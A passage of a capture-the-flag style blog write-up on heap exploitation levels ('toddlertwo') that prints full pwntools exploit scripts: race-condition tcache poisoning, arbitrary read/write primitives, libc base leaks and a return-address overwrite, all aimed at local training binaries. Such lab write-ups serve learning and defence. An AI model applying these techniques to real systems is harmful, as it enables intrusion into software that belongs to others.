class="hljs-string">&quot;PWD : &quot;</span>, pwd)<br>r1.sendline(<span class="hljs-string">b&#x27;send_flag &#x27;</span>+pwd) <br></code></pre></div></td></tr></table></figure><p>full exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">import</span> os<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_perthread_addr</span>(<span class="hljs-params">r1,r2</span>):</span><br>    <span class="hljs-keyword">if</span> os.fork()==<span class="hljs-number">0</span>:<br>        r1.sendline(<span class="hljs-string">b&quot;malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>        exit()<br>    r2.sendline(<span class="hljs-string">b&quot;printf 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>    os.wait()<br>    time.sleep(<span class="hljs-number">0.5</span>)<br>    output = r2.clean()<br>    r1.clean()<br>    leak = <span class="hljs-built_in">next</span>(a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> output.split() <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\x7f&#x27;</span> <span class="hljs-keyword">in</span> a)[<span class="hljs-number">8</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">b&#x27;malloc 0&#x27;</span>)<br>    <span class="hljs-keyword">return</span> pwn.u64(leak)<br><br>perthread_leak = <span class="hljs-number">0</span>   <br>idx = <span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">controlled_allocation</span>(<span class="hljs-params">r1, r2, addr, idx_=<span class="hljs-literal">None</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> idx_ == <span class="hljs-literal">None</span>: <span class="hljs-comment">#嗯, 好像没什么用.</span><br>        idx_ = idx<br>    <span class="hljs-keyword">global</span> perthread_leak<br>    chunk_0_addr = perthread_leak + <span class="hljs-number">0x650</span><br>    chunk_idx_addr = perthread_leak + <span class="hljs-number">0x650</span> + <span class="hljs-number">0x410</span>*idx<br>        <br>    packed = pwn.p64( (chunk_0_addr&gt;&gt;<span class="hljs-number">12</span>)^addr )<br>    r1.clean(),r2.clean()<br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx_&#125;</span>&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">f&#x27;free <span class="hljs-subst">&#123;idx_&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment">#after pass scanf check -&gt; free it -&gt; then overwrite tcache next pointer</span><br>        <span class="hljs-keyword">if</span> os.fork() == <span class="hljs-number">0</span>:<br>            r1.sendline(<span class="hljs-string">f&#x27;free 0&#x27;</span>.encode())<br>            os.kill(os.getpid(), <span class="hljs-number">9</span>)<br>            <br>        r2.send((<span class="hljs-string">b&#x27;scanf 0 &#x27;</span> + packed + <span class="hljs-string">b&#x27;\n&#x27;</span>)*<span class="hljs-number">2000</span>)<br>        os.wait()<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 0 printf 0&#x27;</span>)<br>        r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>        output = r1.recvline()[:-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> output == packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>)[<span class="hljs-number">0</span>]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;OUTPUT: &#x27;</span> + output + <span class="hljs-string">b&#x27; PACKED: &#x27;</span>, packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#malloc the controlled chunk</span><br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx_&#125;</span>&#x27;</span>)<br>    idx = idx_ + <span class="hljs-number">1</span><br>    <br><span class="hljs-comment">#support 8 bytes read</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_read</span>(<span class="hljs-params">r1, r2, addr, idx_=<span class="hljs-literal">None</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> idx_ == <span class="hljs-literal">None</span>: <span class="hljs-comment">#嗯, 好像没什么用.</span><br>        idx_ = idx<br>    controlled_allocation(r1, r2, addr, idx_)<br>    r1.sendline(<span class="hljs-string">f&#x27;printf <span class="hljs-subst">&#123;idx_-<span class="hljs-number">1</span>&#125;</span>&#x27;</span>)<br>    r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>    output = r1.clean()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;MESSAGE IS: &#x27;</span>, output)<br>    <span class="hljs-keyword">return</span> output<br>    <br><span class="hljs-comment">#support digital write</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_write</span>(<span class="hljs-params">r1, r2, addr, value</span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    controlled_allocation(r1, r2, addr)<br>    <span class="hljs-comment">#这里忘加上context.binary的设置直接给我默认i386架构, value给我4字节对齐</span><br>    r1.sendline(<span class="hljs-string">b&#x27;scanf %d &#x27;</span>%(idx-<span class="hljs-number">1</span>) + pwn.flat([value]))<br><br><span class="hljs-keyword">try</span>:<br>    p.kill(),r1.close(),r2.close()<br><span class="hljs-keyword">except</span> Exception:<br>    <span class="hljs-keyword">pass</span><br>pwn.context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br>pwn.context.binary = <span class="hljs-string">&#x27;./toddlertwo_level1.0.elf64&#x27;</span><br>p=pwn.process(<span class="hljs-string">&quot;./toddlertwo_level1.0.elf64&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span> ).read())<br>r1 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>r2 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br><br>perthread_leak = leak_perthread_addr(r1,r2);<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: PERTHREAD: &quot;</span>, <span class="hljs-built_in">hex</span>(perthread_leak))<br><span class="hljs-comment">#main_arena_ptr_address = perthread_leak - 0x8d0 + 0x890</span><br><span class="hljs-comment">#pwn.gdb.attach(p, &quot;b *challenge+0x19b\nb *challenge+0x302\ninit-pwndbg\nc\n&quot;)</span><br><span class="hljs-comment">#main_arena_addr = pwn.u64(arbitrary_read(r1, r2, main_arena_ptr_address)[:-1].ljust(8, b&#x27;\0&#x27;))</span><br><span class="hljs-comment">#print(&quot;MAIN ARENA ADDR: &quot;, hex(main_arena_addr))</span><br><span class="hljs-comment">#pwn.gdb.attach(p, &quot;b challenge+0x10b\ninit-pwndbg\nc\n&quot;)</span><br><span class="hljs-comment">#libc_base = main_arena_addr - 0x1bdba0</span><br><span class="hljs-comment">#print(&#x27;LIBC BASE: &#x27;, hex(libc_base))</span><br><span class="hljs-comment">#secretCorrect_frame_base = libc_base - 0x4640</span><br><span class="hljs-comment">#print(&quot;SECRET FRAME BASE: &quot;, hex(secretCorrect_frame_base))</span><br><span class="hljs-comment">#pwn.gdb.attach(p, &quot;b *challenge+0x19b\nb *challenge+0x302\ninit-pwndbg\nc\n&quot;)</span><br><span class="hljs-comment">#arbitrary_read(r1, r2, 0x405650, 2)</span><br>r1.sendline(<span class="hljs-string">b&#x27;malloc 2&#x27;</span>)<br>arbitrary_write(r1, r2, <span class="hljs-number">0x405220</span>+<span class="hljs-number">0x10</span>, <span class="hljs-number">0x405655</span>)<br>r1.sendline(<span class="hljs-string">b&#x27;printf 2&#x27;</span>)<br>r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>pwd = r1.clean()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;PWD : &quot;</span>, pwd)<br>r1.sendline(<span class="hljs-string">b&#x27;send_flag &#x27;</span>+pwd)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> r1.clean().split(<span class="hljs-string">b&#x27;\n&#x27;</span>) <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#123;&#x27;</span> <span class="hljs-keyword">in</span> a))<br>pwn.gdb.attach(p, <span class="hljs-string">&quot;init-pwndbg\n&quot;</span>)<br></code></pre></div></td></tr></table></figure><p>there is no difference between .0 and .1 level. </p><h4 id="level2-4"><a href="#level2-4" class="headerlink" title="level2"></a>level2</h4><p>protections are all turned on.</p><p>there is no <code>load_secret()</code> function in main, so the last way may be rewriting the retrun address of <code>challenge()</code>.</p><p>for test:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">p/d (<span class="hljs-keyword">int</span>[<span class="hljs-number">15</span>])stored<br>p/x (<span class="hljs-keyword">char</span>*[<span class="hljs-number">15</span>])messages<br></code></pre></div></td></tr></table></figure><p>it’s so hard to do with libc-2.33. the memory align check is annoying. just assuming that the binary base is already known.</p><p>fail exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">import</span> os<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_perthread_addr</span>(<span class="hljs-params">r1,r2</span>):</span><br>    <span class="hljs-keyword">if</span> os.fork()==<span class="hljs-number">0</span>:<br>        r1.sendline(<span class="hljs-string">b&quot;malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>        exit()<br>    r2.sendline(<span class="hljs-string">b&quot;printf 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>    os.wait()<br>    time.sleep(<span class="hljs-number">0.01</span>)<br>    output = r2.clean()<br>    r1.clean()<br>    leak = <span class="hljs-built_in">next</span>(a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> output.split() <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\x7f&#x27;</span> <span class="hljs-keyword">in</span> a)[<span class="hljs-number">8</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">b&#x27;malloc 0&#x27;</span>)<br>    <span class="hljs-keyword">return</span> pwn.u64(leak)<br><br>perthread_leak = <span class="hljs-number">0</span>   <br>idx = <span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">controlled_allocation</span>(<span class="hljs-params">r1, r2, addr</span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">global</span> perthread_leak<br>    chunk_0_addr = perthread_leak + <span class="hljs-number">0x650</span><br>        <br>    packed = pwn.p64( (chunk_0_addr&gt;&gt;<span class="hljs-number">12</span>)^addr )<br>    r1.clean(),r2.clean()<br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">f&#x27;free <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment">#after pass scanf check -&gt; free it -&gt; then overwrite tcache next pointer</span><br>        <span class="hljs-keyword">if</span> os.fork() == <span class="hljs-number">0</span>:<br>            r1.sendline(<span class="hljs-string">f&#x27;free 0&#x27;</span>.encode())<br>            os.kill(os.getpid(), <span class="hljs-number">9</span>)<br>            <br>        r2.send((<span class="hljs-string">b&#x27;scanf 0 &#x27;</span> + packed + <span class="hljs-string">b&#x27;\n&#x27;</span>)*<span class="hljs-number">2000</span>)<br>        os.wait()<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 0 printf 0&#x27;</span>)<br>        output = <span class="hljs-string">b&#x27;&#x27;</span><br>        r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>        output = r1.recvline()[:-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> output == packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>)[<span class="hljs-number">0</span>]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;OUTPUT: &#x27;</span> + output + <span class="hljs-string">b&#x27; PACKED: &#x27;</span>, packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#malloc the controlled chunk</span><br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>.encode())<br>    idx += <span class="hljs-number">1</span><br>    <br><span class="hljs-comment">#support 8 bytes read</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_read</span>(<span class="hljs-params">r1, r2, addr, unalign=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> unalign:<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 10&#x27;</span>)<br>        arbitrary_write(r1, r2, binary_base+<span class="hljs-number">0x5040</span>+<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>, addr)<br>        r1.sendline(<span class="hljs-string">b&#x27;printf 10&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        controlled_allocation(r1, r2, addr)<br>        r1.sendline(<span class="hljs-string">f&#x27;printf <span class="hljs-subst">&#123;idx-<span class="hljs-number">1</span>&#125;</span>&#x27;</span>.encode())<br>    r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>    output = r1.clean()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;MESSAGE IS: &#x27;</span>, output)<br>    pwn.context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>    <span class="hljs-keyword">return</span> output<br>    <br><span class="hljs-comment">#support digital write</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_write</span>(<span class="hljs-params">r1, r2, addr, value, unalign=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> unalign:<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 10&#x27;</span>)<br>        arbitrary_write(r1, r2, binary_base+<span class="hljs-number">0x5040</span>++<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>, addr)<br>        r1.sendline(<span class="hljs-string">b&#x27;scanf 10 &#x27;</span> + value[<span class="hljs-number">0</span>].to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;little&#x27;</span>))<br>        <span class="hljs-keyword">return</span><br>    controlled_allocation(r1, r2, addr)<br>    r1.sendline(<span class="hljs-string">b&#x27;scanf %d &#x27;</span>%(idx-<span class="hljs-number">1</span>) + pwn.flat(value))<br><br><span class="hljs-keyword">try</span>:<br>    p.kill(),r1.close(),r2.close()<br><span class="hljs-keyword">except</span> Exception:<br>    <span class="hljs-keyword">pass</span><br>pwn.context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br>pwn.context.binary = <span class="hljs-string">&#x27;./toddlertwo_level2.0.elf64&#x27;</span><br>p=pwn.process(<span class="hljs-string">&quot;./toddlertwo_level2.0.elf64&quot;</span>)<br>p.clean()<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-built_in">print</span>(f.read())<br>r1 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>r2 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br><br>perthread_leak = leak_perthread_addr(r1,r2);<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: PERTHREAD: &quot;</span>, <span class="hljs-built_in">hex</span>(perthread_leak))<br>main_arena_ptr_address = perthread_leak - <span class="hljs-number">0x8d0</span> + <span class="hljs-number">0x890</span><br>time.sleep(<span class="hljs-number">0.2</span>)<br>main_arena_addr = pwn.u64(arbitrary_read(r1, r2, main_arena_ptr_address)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;MAIN ARENA ADDR: &quot;</span>, <span class="hljs-built_in">hex</span>(main_arena_addr))<br>libc_base = main_arena_addr - <span class="hljs-number">0x1bdba0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;LIBC BASE: &#x27;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br>stored_rip_addr = main_arena_addr - <span class="hljs-number">0x1c1d78</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;STORED RIP ADDR: &#x27;</span>, <span class="hljs-built_in">hex</span>(stored_rip_addr))<br><span class="hljs-comment">#stored_rip = pwn.u64(arbitrary_read(r1, r2, stored_rip_addr, True)[:-1].ljust(8, b&#x27;\0&#x27;))</span><br><span class="hljs-comment">#print(&#x27;STORED RIP: &#x27;, stored_rip)</span><br>binary_base = <span class="hljs-number">0</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span>) <span class="hljs-keyword">as</span> f: <br>    binary_base = <span class="hljs-built_in">int</span>(f.read(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;BINARY BASE: &#x27;</span>, <span class="hljs-built_in">hex</span>(binary_base))<br><span class="hljs-comment">#LET&#x27;S ROLLING</span><br>win_addr = binary_base + <span class="hljs-number">0x1778</span><br>arbitrary_write(r1, r2, stored_rip_addr, [win_addr], <span class="hljs-literal">True</span>)<br>r1.sendline(<span class="hljs-string">b&#x27;quit&#x27;</span>)<br>p.clean()<br><span class="hljs-built_in">print</span>(r1.clean().decode())<br></code></pre></div></td></tr></table></figure><h4 id="level3-5"><a href="#level3-5" class="headerlink" title="level3"></a>level3</h4><p>a hint from the code:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">fwrite(<span class="hljs-string">&quot;Storing the secret in this thread&#x27;s stack.\n&quot;</span>, <span class="hljs-number">1uLL</span>, <span class="hljs-number">0x2B</span>uLL, (FILE *)__readfsqword(<span class="hljs-number">0xFFFFFFF8</span>));<br>load_secret(&amp;v5);<br></code></pre></div></td></tr></table></figure><p>so it’s quite easy, just need to locate the challenge’s frame base. </p><p>the stored_rip_addr is at a constant offset from the challenge’s frame base.</p><h4 id="level4-6"><a href="#level4-6" class="headerlink" title="level4"></a>level4</h4><p>nothing special</p><h4 id="level5-7"><a href="#level5-7" class="headerlink" title="level5"></a>level5</h4><p>Storing the secret in the environment by <code>setenv()</code>. env is pointed by the <code>environ</code> in libc. i need to have a look at that blog to learn how to dig into ld library. let me add a new section in key points.</p><p>distance libc_base ld_base = 0x1df000 bytes. the secret is stored in the <strong>main thread heap</strong>. </p><p><strong>plan:</strong> </p><blockquote><p>wrong start:</p><ul><li><del>at first read out of the <strong>binary base</strong>(in kali the only way i can is cheat…)</del></li><li><del>locating the env string in heap. read out of it.</del></li></ul></blockquote><ul><li>after read out the main_arena’s base, read out the <code>top</code> field content, which is the top chunk of the main thread near the binary. it won’t change when child threads receiving and processing commands.</li><li>next locate the distance between the top_chunk and secret’s address. this is also a constant.</li><li>read out the secret.</li><li>then use <code>send_flag</code> command.</li><li><del>or just change the return address of challenge.</del> </li></ul><p>exp(the second method):</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">import</span> os<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_perthread_addr</span>(<span class="hljs-params">r1,r2</span>):</span><br>    <span class="hljs-keyword">if</span> os.fork()==<span class="hljs-number">0</span>:<br>        r1.sendline(<span class="hljs-string">b&quot;malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>        exit()<br>    r2.sendline(<span class="hljs-string">b&quot;printf 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>    os.wait()<br>    time.sleep(<span class="hljs-number">0.01</span>)<br>    output = r2.clean()<br>    r1.clean()<br>    leak = <span class="hljs-built_in">next</span>(a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> output.split() <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\x7f&#x27;</span> <span class="hljs-keyword">in</span> a)[<span class="hljs-number">8</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">b&#x27;malloc 0&#x27;</span>)<br>    <span class="hljs-keyword">return</span> pwn.u64(leak)<br><br>perthread_leak = <span class="hljs-number">0</span>   <br>idx = <span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">controlled_allocation</span>(<span class="hljs-params">r1, r2, addr</span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">global</span> perthread_leak<br>    chunk_0_addr = perthread_leak + <span class="hljs-number">0x650</span><br>        <br>    packed = pwn.p64( (chunk_0_addr&gt;&gt;<span class="hljs-number">12</span>)^addr )<br>    r1.clean(),r2.clean()<br>    r1.sendline(<span 